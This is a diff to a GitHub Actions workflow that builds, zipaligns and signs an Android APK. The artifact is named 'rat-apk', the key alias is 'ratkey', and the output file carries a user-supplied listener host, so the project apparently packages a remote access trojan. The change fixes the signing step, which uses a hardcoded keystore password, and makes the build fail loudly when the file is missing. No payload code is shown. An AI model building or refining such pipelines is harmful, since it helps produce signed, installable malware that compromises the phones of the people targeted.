@@ -208,16 +208,50 @@ jobs:
         chmod +x gradlew
         ./gradlew assembleRelease --no-daemon
 
-    - name: Sign APK
+    - name: Sign APK Properly
       run: |
         # Generate keystore for signing
+        echo "🔑 Generating keystore..."
         keytool -genkey -v -keystore release.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
         
-        # Sign the APK
-        $ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks release.keystore --ks-pass pass:123456 --key-pass pass:123456 app/build/outputs/apk/release/app-release-unsigned.apk || echo "Signing failed but continuing"
+        # Define paths
+        UNSIGNED_APK="app/build/outputs/apk/release/app-release-unsigned.apk"
+        ALIGNED_APK="app/build/outputs/apk/release/app-release-aligned.apk"
+        SIGNED_APK="${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk"
         
-        # Align and rename
-        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 app/build/outputs/apk/release/app-release-unsigned.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk || cp app/build/outputs/apk/release/app-release-unsigned.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
+        # Check if unsigned APK exists
+        if [ ! -f "$UNSIGNED_APK" ]; then
+          echo "❌ Unsigned APK not found at $UNSIGNED_APK"
+          exit 1
+        fi
+        
+        echo "📦 Found unsigned APK: $(ls -lh $UNSIGNED_APK)"
+        
+        # Step 1: Zipalign the APK
+        echo "🔧 Aligning APK with zipalign..."
+        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 "$UNSIGNED_APK" "$ALIGNED_APK"
+        
+        # Step 2: Sign the aligned APK
+        echo "✍️ Signing APK with apksigner..."
+        $ANDROID_HOME/build-tools/33.0.0/apksigner sign \
+          --ks release.keystore \
+          --ks-pass pass:123456 \
+          --key-pass pass:123456 \
+          --out "$SIGNED_APK" \
+          "$ALIGNED_APK"
+        
+        # Step 3: Verify the signature
+        echo "✅ Verifying APK signature..."
+        $ANDROID_HOME/build-tools/33.0.0/apksigner verify --verbose "$SIGNED_APK"
+        
+        # Step 4: Check if signed APK was created
+        if [ -f "$SIGNED_APK" ]; then
+          echo "✅ Signed APK created successfully: $SIGNED_APK"
+          echo "📊 Signed APK size: $(ls -lh $SIGNED_APK | awk '{print $5}')"
+        else
+          echo "❌ Failed to create signed APK"
+          exit 1
+        fi
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
@@ -225,4 +259,4 @@ jobs:
         name: rat-apk
         path: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
         retention-days: 1
-        if-no-files-found: warn
+        if-no-files-found: error
